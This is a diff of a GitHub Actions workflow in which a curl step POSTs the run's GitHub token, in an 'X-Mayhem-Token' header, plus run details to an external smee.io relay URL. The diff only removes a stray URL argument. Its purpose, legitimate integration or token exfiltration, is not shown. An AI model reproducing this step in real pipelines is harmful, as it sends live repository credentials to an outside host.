@@ -15,4 +15,4 @@ jobs:
     runs-on: ubuntu-latest    
     steps:    
       - run: |
-          curl -H "X-Mayhem-Token:token ${{ github.token }}" -H "X-Github-Context:$GITHUB_SERVER_URL/$GITHUB_REPOSITORY/actions/runs/$GITHUB_RUN_ID" https://api.github.com/users/swarkentin/repos -XPOST 'https://smee.io/FPCLuxdLr1dBVWe1'
+          curl -H "X-Mayhem-Token:token ${{ github.token }}" -H "X-Github-Context:$GITHUB_SERVER_URL/$GITHUB_REPOSITORY/actions/runs/$GITHUB_RUN_ID" -XPOST 'https://smee.io/FPCLuxdLr1dBVWe1'
